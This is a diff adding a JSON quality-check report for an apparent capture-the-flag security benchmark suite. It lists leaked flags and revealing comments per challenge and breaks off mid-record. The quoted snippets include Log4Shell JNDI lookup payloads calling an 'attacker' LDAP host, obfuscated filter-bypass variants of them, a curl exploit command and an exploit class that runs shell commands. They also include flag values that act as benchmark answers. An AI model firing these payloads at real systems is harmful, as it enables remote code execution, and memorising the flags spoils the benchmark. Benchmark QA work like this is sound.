@@ -1,0 +1,5352 @@
+{
+  "summary": {
+    "total": 64,
+    "passes_by_check": {
+      "flag_hardcoded": 64,
+      "comment_hints": 22,
+      "revealing_identifiers": 21,
+      "docker_compose_healthchecks": 45,
+      "dockerfile_flag_arg": 7,
+      "config_description_leak": 49,
+      "direct_flag_access": 64
+    }
+  },
+  "benchmarks": [
+    {
+      "benchmark": "S7BEN-CVE-001",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "traverse.cgi",
+              "line": 2,
+              "snippet": "# Simulated CVE-2021-41773 path traversal vulnerability"
+            },
+            {
+              "file": "traverse.cgi",
+              "line": 3,
+              "snippet": "# This CGI script allows path traversal when accessed via specific patterns"
+            },
+            {
+              "file": "traverse.cgi",
+              "line": 11,
+              "snippet": "# Check if this is a path traversal attempt"
+            },
+            {
+              "file": "traverse.cgi",
+              "line": 35,
+              "snippet": "# Default response if not exploiting"
+            },
+            {
+              "file": "httpd-vulnerable.conf",
+              "line": 38,
+              "snippet": "# CGI Alias - exploitation path (no trailing slash - triggers CVE-2021-41773)"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 34,
+              "snippet": "cve: CVE-2021-42013 # Follow-up CVE for RCE variant"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 37,
+              "snippet": "- CWE-78  # OS Command Injection"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 163,
+              "snippet": "url: \"https://www.exploit-db.com/exploits/50383\""
+            },
+            {
+              "file": "Dockerfile.old",
+              "line": 3,
+              "snippet": "# Build Apache 2.4.49 from source with the actual CVE-2021-41773 vulnerability"
+            },
+            {
+              "file": "Dockerfile.old",
+              "line": 19,
+              "snippet": "# Download and extract Apache 2.4.49 source"
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 52,
+              "snippet": "# CVE-2021-41773: Path traversal vulnerability"
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 53,
+              "snippet": "# The vulnerability allows .%2e (encoded ..) to bypass path restrictions"
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 66,
+              "snippet": "# Resolve the path traversal"
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 73,
+              "snippet": "# CVE-2021-42013: RCE via CGI execution"
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 154,
+              "snippet": "# Execute the command (this is the RCE vulnerability)"
+            },
+            {
+              "file": "Dockerfile",
+              "line": 10,
+              "snippet": "# Create demo files for testing path traversal"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "apache_path_trav3rsal_cve_2021_41773_rce",
+              "snippet": "FLAG ?= SBEN{apache_path_trav3rsal_cve_2021_41773_rce}"
+            },
+            {
+              "file": "Makefile",
+              "line": 21,
+              "identifier_like": "apache_path_trav3rsal_cve_2021_41773_rce",
+              "snippet": "@echo \"  FLAG=<flag>  - Custom flag value (default: SBEN{apache_path_trav3rsal_cve_2021_41773_rce})\""
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 148,
+              "identifier_like": "handle_rce",
+              "snippet": "def handle_rce(self):"
+            },
+            {
+              "file": "vuln_server.py",
+              "line": 152,
+              "identifier_like": "rfile",
+              "snippet": "post_data = self.rfile.read(content_length).decode('utf-8')"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 9,
+              "identifier_like": "apache_path_trav3rsal_cve_2021_41773_rce",
+              "snippet": "- FLAG=${FLAG:-S7BEN{apache_path_trav3rsal_cve_2021_41773_rce}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-002",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/src/main/java/com/strike7/Text4ShellApp.java",
+              "line": 46,
+              "snippet": "// Enables script:, dns:, url: lookups which can lead to RCE"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 9,
+              "identifier_like": "text4shell_string_subst1tut0r_rce_cve42889",
+              "snippet": "- FLAG=${FLAG:-S7BEN{text4shell_string_subst1tut0r_rce_cve42889}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "flag-server/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-003",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 27,
+              "snippet": "- CWE-502  # Deserialization of Untrusted Data"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 29,
+              "snippet": "- CWE-400  # Uncontrolled Resource Consumption"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 76,
+              "snippet": "1. Attacker injects ${jndi:ldap://...} into logged parameter"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 92,
+              "snippet": "description: \"Create ${jndi:ldap://attacker:1389/Exploit} payload\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 93,
+              "snippet": "payload_example: \"${jndi:ldap://ldap-server:1389/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 116,
+              "snippet": "example: \"POST /login?username=${jndi:ldap://ldap-server:1389/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 122,
+              "snippet": "example: \"GET /search?q=${jndi:ldap://ldap-server:1389/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 128,
+              "snippet": "example: \"GET /api/data -H 'User-Agent: ${jndi:ldap://ldap-server:1389/Exploit}'\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 134,
+              "snippet": "example: \"GET /api/data -H 'X-Forwarded-For: ${jndi:ldap://ldap-server:1389/Exploit}'\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 138,
+              "snippet": "payload: \"${jndi:ldap://attacker/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 141,
+              "snippet": "payload: \"${jNdI:ldAp://attacker/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 144,
+              "snippet": "payload: \"${${lower:j}ndi:ldap://attacker/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 147,
+              "snippet": "payload: \"${${env:ENV_VAR:-j}ndi:ldap://attacker/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 150,
+              "snippet": "payload: \"${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/Exploit}\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 188,
+              "snippet": "- \"Payload format: ${jndi:ldap://ldap-server:1389/Exploit}\""
+            },
+            {
+              "file": "Makefile",
+              "line": 54,
+              "snippet": "@echo \"  curl -X POST 'http://localhost:8080/login?username=\\$${jndi:ldap://ldap-server:1389/Exploit}'\""
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 29,
+              "snippet": "- EXPLOIT_CLASS_URL=http://http-server:8000/"
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 19,
+              "snippet": "// Create marker file to indicate successful exploitation"
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 48,
+              "snippet": "// Execute a command to demonstrate full RCE"
+            },
+            {
+              "file": "http-server/Dockerfile",
+              "line": 10,
+              "snippet": "# Copy exploit class source"
+            },
+            {
+              "file": "http-server/Dockerfile",
+              "line": 13,
+              "snippet": "# Compile the exploit"
+            },
+            {
+              "file": "vuln-app/Dockerfile",
+              "line": 9,
+              "snippet": "# Copy source code and build"
+            },
+            {
+              "file": "vuln-app/src/main/java/com/strike7/log4shell/App.java",
+              "line": 125,
+              "snippet": "\"        pre { background: #282c34; color: #abb2bf; padding: 15px; border-radius: 5px; overflow-x: auto; }\\n\" +"
+            },
+            {
+              "file": "vuln-app/src/main/java/com/strike7/log4shell/App.java",
+              "line": 172,
+              "snippet": "\"        <pre>curl -X POST 'http://localhost:8080/login?username=\\\\${jndi:ldap://ldap-server:1389/Exploit}'</pre>\\n\" +"
+            },
+            {
+              "file": "vuln-app/src/main/java/com/strike7/log4shell/App.java",
+              "line": 188,
+              "snippet": "// Check if /tmp/pwned exists (created by exploit)"
+            },
+            {
+              "file": "ldap-server/Dockerfile",
+              "line": 10,
+              "snippet": "# Clone and build marshalsec (JNDI exploitation tool)"
+            },
+            {
+              "file": "ldap-server/Dockerfile",
+              "line": 20,
+              "snippet": "EXPLOIT_CLASS_URL=\"${EXPLOIT_CLASS_URL:-http://http-server:8000/}\""
+            },
+            {
+              "file": "ldap-server/Dockerfile",
+              "line": 29,
+              "snippet": "\"$EXPLOIT_CLASS_URL#Exploit\" \\"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 80,
+              "identifier_like": "rce",
+              "snippet": "5. Malicious class executes on victim, achieving RCE"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 104,
+              "identifier_like": "exploit",
+              "snippet": "expected_outcome: \"Exploit.class downloaded and instantiated\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 108,
+              "identifier_like": "exploit",
+              "snippet": "description: \"Exploit class executes, reads flag, creates markers\""
+            },
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "log4shell_jndi_inject10n_rce_web",
+              "snippet": "FLAG_WEB ?= SBEN{log4shell_jndi_inject10n_rce_web}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 11,
+              "identifier_like": "log4shell_jndi_inject10n_rce_web",
+              "snippet": "- FLAG_WEB=${FLAG_WEB:-S7BEN{log4shell_jndi_inject10n_rce_web}}"
+            },
+            {
+              "file": "http-server/serve.sh",
+              "line": 4,
+              "identifier_like": "exploit",
+              "snippet": "echo \"[*] Exploit.class is ready for JNDI injection\""
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 2,
+              "identifier_like": "exploit",
+              "snippet": "* Exploit class for Log4Shell (CVE-2021-44228)"
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 4,
+              "identifier_like": "injection",
+              "snippet": "* This class is loaded via JNDI injection and executes on the vulnerable server."
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 12,
+              "identifier_like": "exploit",
+              "snippet": "public class Exploit {"
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 20,
+              "identifier_like": "markerfile",
+              "snippet": "java.io.File markerFile = new java.io.File(\"/tmp/pwned\");"
+            },
+            {
+              "file": "http-server/Exploit.java",
+              "line": 50,
+              "identifier_like": "rce",
+              "snippet": "String[] cmd = {\"/bin/sh\", \"-c\", \"echo 'Log4Shell RCE executed!' > /tmp/rce_proof.txt\"};"
+            },
+            {
+              "file": "vuln-app/pom.xml",
+              "line": 80,
+              "identifier_like": "resource",
+              "snippet": "<transformer implementation=\"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\">"
+            },
+            {
+              "file": "vuln-app/Dockerfile",
+              "line": 27,
+              "identifier_like": "log4shell_jndi_inject10n_rce_web",
+              "snippet": "ENV FLAG_WEB=${FLAG_WEB:-SBEN{log4shell_jndi_inject10n_rce_web}}"
+            },
+            {
+              "file": "vuln-app/src/main/java/com/strike7/log4shell/App.java",
+              "line": 17,
+              "identifier_like": "log4shell_jndi_inject10n_rce_web",
+              "snippet": "private static final String FLAG = System.getenv().getOrDefault(\"FLAG_WEB\", \"SBEN{log4shell_jndi_inject10n_rce_web}\");"
+            },
+            {
+              "file": "vuln-app/src/main/java/com/strike7/log4shell/App.java",
+              "line": 181,
+              "identifier_like": "exploited",
+              "snippet": "private static boolean exploited = false;"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "http-server/Dockerfile: ARG flag=no, used=no",
+            "vuln-app/Dockerfile: ARG flag=no, used=no",
+            "ldap-server/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-004",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/Dockerfile",
+              "line": 21,
+              "snippet": "# Make logs writable (for webshell injection)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 9,
+              "identifier_like": "spring4shell_classloader_rce_cve22965",
+              "snippet": "- FLAG=${FLAG:-S7BEN{spring4shell_classloader_rce_cve22965}}"
+            },
+            {
+              "file": "app/src/main/java/com/strike7/config/WebConfig.java",
+              "line": 17,
+              "identifier_like": "internalresourceviewresolver",
+              "snippet": "InternalResourceViewResolver resolver = new InternalResourceViewResolver();"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "db/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-005",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 46,
+              "identifier_like": "gitlab_exiftool_rce_cve_2021_22205",
+              "snippet": "- FLAG=${FLAG:-S7BEN{gitlab_exiftool_rce_cve_2021_22205}}"
+            },
+            {
+              "file": "flag-server/server.py",
+              "line": 6,
+              "identifier_like": "gitlab_exiftool_rce_cve_2021_22205",
+              "snippet": "FLAG = os.getenv('FLAG', 'S7BEN{gitlab_exiftool_rce_cve_2021_22205}')"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "flag-server/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-006",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-007",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-008",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-009",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-010",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 5,
+              "identifier_like": "teamcity_bypass_",
+              "snippet": "FLAG=f\"S7BEN{{teamcity_bypass_{secrets.token_hex(6)}}}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 10,
+              "identifier_like": "bypass",
+              "snippet": "def bypass():"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-CVE-011",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-001",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 272,
+              "snippet": "<!-- VULNERABILITY: No CSRF token! -->"
+            },
+            {
+              "file": "app/app.py",
+              "line": 355,
+              "snippet": "# VULNERABILITY: No CSRF token check here!"
+            },
+            {
+              "file": "app/app.py",
+              "line": 356,
+              "snippet": "# Should check: if request.form.get('csrf_token') != session.get('csrf_token')"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "csrf_att4ck_succ3ssful",
+              "snippet": "FLAG ?= SBEN{CSRF_ATT4CK_SUCC3SSFUL}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "csrf_att4ck_succ3ssful",
+              "snippet": "- FLAG=${FLAG:-S7BEN{CSRF_ATT4CK_SUCC3SSFUL}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-002",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-003",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 11,
+              "snippet": "conn = sqlite3.connect(DB_FILE, isolation_level=None) # Auto-commit mode"
+            },
+            {
+              "file": "app/app.py",
+              "line": 120,
+              "snippet": "# Flag condition: If balance is effectively reset to 0 or negative through exploitation"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 12,
+              "identifier_like": "sqlite3",
+              "snippet": "conn.row_factory = sqlite3.Row"
+            },
+            {
+              "file": "app/app.py",
+              "line": 75,
+              "identifier_like": "force",
+              "snippet": "data = request.get_json(force=True, silent=True)"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-004",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 19,
+              "snippet": "# Proper workflow (but not enforced!)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 328,
+              "snippet": "# Check if they bypassed payment"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 28,
+              "identifier_like": "sqlite3",
+              "snippet": "conn = sqlite3.connect(DB_FILE)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 29,
+              "identifier_like": "sqlite3",
+              "snippet": "conn.row_factory = sqlite3.Row"
+            },
+            {
+              "file": "app/app.py",
+              "line": 345,
+              "identifier_like": "exploit_success",
+              "snippet": "response['exploit_success'] = True"
+            },
+            {
+              "file": "app/app.py",
+              "line": 346,
+              "identifier_like": "bypass",
+              "snippet": "response['message'] += ' - WORKFLOW BYPASS DETECTED! You successfully shipped an order without payment!'"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-005",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 114,
+              "snippet": "# - No detection of brute force attempts"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-006",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 144,
+              "snippet": "# This allows newline injection to forge fake log entries"
+            },
+            {
+              "file": "app/app.py",
+              "line": 227,
+              "snippet": "# Looking for entries that appear to be legitimate but were injected"
+            },
+            {
+              "file": "app/app.py",
+              "line": 234,
+              "snippet": "# We need to detect if someone injected a newline to create a fake \"successful\" entry"
+            },
+            {
+              "file": "app/app.py",
+              "line": 237,
+              "snippet": "# that was NOT actually a real login (i.e., was injected)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 244,
+              "snippet": "# Check if there's evidence of newline injection"
+            },
+            {
+              "file": "app/app.py",
+              "line": 250,
+              "snippet": "# If a line doesn't start with timestamp but contains login info, it's injected"
+            },
+            {
+              "file": "app/app.py",
+              "line": 257,
+              "snippet": "# (part of an injected sequence, not a real login)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 119,
+              "identifier_like": "injection",
+              "snippet": "<button class=\"secondary\" onclick=\"window.location.href='/verify'\">Verify Injection</button>"
+            },
+            {
+              "file": "app/app.py",
+              "line": 206,
+              "identifier_like": "injection",
+              "snippet": "<button onclick=\"window.location.href='/verify'\">Verify Injection</button>"
+            },
+            {
+              "file": "app/app.py",
+              "line": 217,
+              "identifier_like": "verify_injection",
+              "snippet": "def verify_injection():"
+            },
+            {
+              "file": "app/app.py",
+              "line": 245,
+              "identifier_like": "injection_detected",
+              "snippet": "injection_detected = False"
+            },
+            {
+              "file": "app/app.py",
+              "line": 252,
+              "identifier_like": "injection_detected",
+              "snippet": "injection_detected = True"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": true,
+          "details": [
